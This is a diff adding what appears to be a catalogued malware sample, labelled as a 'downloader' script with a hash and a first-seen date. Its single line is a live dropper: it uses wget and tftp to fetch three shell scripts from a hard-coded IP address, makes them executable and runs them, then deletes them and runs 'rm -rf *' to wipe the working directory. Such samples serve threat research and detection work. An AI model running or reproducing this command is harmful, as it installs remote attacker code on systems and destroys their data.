@@ -1,0 +1,10 @@
+# sha256: ae3f88c4ea4176a189ed352ce4c8819db3ddb6cea48ac47c19a5687922dc9496
+# family: downloader
+# kind: script
+# size_bytes: 306
+# first_seen: 2026-05-24 01:35:35.283379 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+cd /tmp || cd /run || cd /; wget http://45.81.234.64/10Gbins.sh; chmod 777 10Gbins.sh; sh 10Gbins.sh; tftp 45.81.234.64 -c get 10Gtftp1.sh; chmod 777 10Gtftp1.sh; sh 10Gtftp1.sh; tftp -r 10Gtftp2.sh -g 45.81.234.64; chmod 777 10Gtftp2.sh; sh 10Gtftp2.sh; rm -rf 10Gbins.sh 10Gtftp1.sh 10Gtftp2.sh; rm -rf *
